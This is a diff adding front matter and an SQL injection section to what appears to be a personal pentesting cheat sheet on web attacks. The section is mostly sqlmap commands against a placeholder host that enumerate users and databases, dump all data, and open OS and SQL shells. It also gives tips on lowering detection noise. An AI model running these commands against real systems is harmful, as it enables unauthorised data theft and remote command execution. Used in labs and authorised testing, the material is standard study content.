@@ -1,3 +1,7 @@
+---
+description: Web application vulns and exploits
+---
+
 # Web Attacks
 
 ## Banner grabbing
@@ -85,5 +89,60 @@ XSS filter bypass cheatsheet: [OWASP cheatsheet](https://owasp.org/www-community
 
 **Persistent XSS**: Payload remains in the site that multiple users can fall victim to. Typically embedded via a form or forum post.
 
+## SQL Injections
 
+### GET
+
+```text
+sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id
+```
+
+```text
+sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U
+```
+
+### Database USER
+
+```text
+sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U --user
+```
+
+### Databases
+
+```text
+sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U --dbs
+```
+
+### Dump all
+
+```text
+sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U --dump
+```
+
+### POST
+
+Find the parameters that are being passed in POST using BurpSuite.  
+E.g: **`username=some&password=thing`** where the parameter username is vulnerable.
+
+```text
+sqlmap -u 'http://10.10.10.10/login.php' --data='username=some&password=thing' -p username --technique=B
+```
+
+**The Databases, Users and dump-all switches are same as for the GET parameter.**
+
+If you aren't able to deduce which parameter is vulnerable in POST, you can drop the -p switch. SQLMAP will try to test them and find it on it's own so don't sweat it and also for most of the prompts use the default options\(i.e. just press enter\).
+
+The --technique switch is to create less noise and prevent the service from shutting down due to query overload. If the given techniques do not work try it removing the switch.
+
+### OS-Shell
+
+```text
+sqlmap -u "http://10.10.10.10/login.php" --os-shell
+```
+
+### SQL-Shell
+
+```text
+sqlmap -u "http://10.10.10.10/login.php" --sql-shell
+```
 
